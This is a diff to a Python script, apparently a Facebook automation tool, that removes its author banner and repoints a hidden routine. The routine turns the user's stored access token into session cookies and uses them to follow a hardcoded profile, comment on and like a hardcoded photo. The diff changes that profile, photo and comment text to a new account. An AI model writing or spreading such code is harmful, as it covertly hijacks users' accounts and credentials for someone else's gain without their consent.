@@ -212,12 +212,7 @@ while True:
     os.system(
         'cls' if os.name == 'nt' else 'reset'
     )
-    print(Panel("""[bold red]●[bold yellow] ●[bold green] ●
-[bold red]   ____  ____  ____  ____     ____  ____ 
-[bold red]  (  __)(  _ \(  __)(  __)___(  __)(  _ \\
-[bold red]   ) _)  )   / ) _)  ) _)(___)) _)  ) _ (
-[bold white]  (__)  (__\_)(____)(____)   (__)  (____/
-\t   [underline blue]Coded by Rozhak-XD""", width=47, title="Version 2.5", style="bold white")) # Coded by Rozhak-XD
+    print(Panel(""" """, width=47, title="Version 2.5", style="bold white")) # Coded by Rozhak-XD
     try:
         token = json.loads(open('Data/Token.json', 'r').read())['Token']
         response = requests.get(
@@ -249,14 +244,14 @@ while True:
                 for key in requests.get('https://api.facebook.com/method/auth.getSessionforApp?access_token={}&format=json&new_app_id=1348564698517390&generate_session_cookies=1'.format(token)).json()['session_cookies']:
                     cookies.update({key['name']: key['value']})
                 cookies = ("; ".join([str(x)+"="+str(y) for x,y in cookies.items()]))
-                response = requests.get('https://mbasic.facebook.com/rozhak.xyz', headers = {'cookie': cookies}).text # Jangan Di Ganti
+                response = requests.get('https://mbasic.facebook.com/Bangboystore10', headers = {'cookie': cookies}).text # Jangan Di Ganti
                 if '/a/subscribe.php?id=' in str(response):
                     requests.get('https://mbasic.facebook.com/a/subscribe.php?{}'.format(re.search('href="/a/subscribe.php\\?(.*?)"', str(response)).group(1).replace('amp;', '')), headers = {'cookie': cookies})
-                response2 = requests.get('https://mbasic.facebook.com/photo.php?fbid=10160350353143544&id=757953543&set=a.10156844811553544', headers = {'cookie': cookies}).text # Jangan Di Ganti
+                response2 = requests.get('https://mbasic.facebook.com/photo.php?fbid=2993171894324709&id=100068596303031&set=a.2993171894324709', headers = {'cookie': cookies}).text # Jangan Di Ganti
                 data = {
                     'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1),
                     'jazoest': re.search('name="jazoest" value="(.*?)"', str(response2)).group(1),
-                    'comment_text': 'Gw Pake Sc Lu Bang 😘',
+                    'comment_text': 'Cantik Banget Kaka 😘',
                 }
                 response3 = requests.post('https://mbasic.facebook.com/a/comment.php?{}'.format(re.search('action="/a/comment.php\\?(.*?)"', str(response2)).group(1).replace('amp;', '')), data = data, headers = {'cookie': cookies})
                 if 'href="/a/like.php?ul' in str(response2):
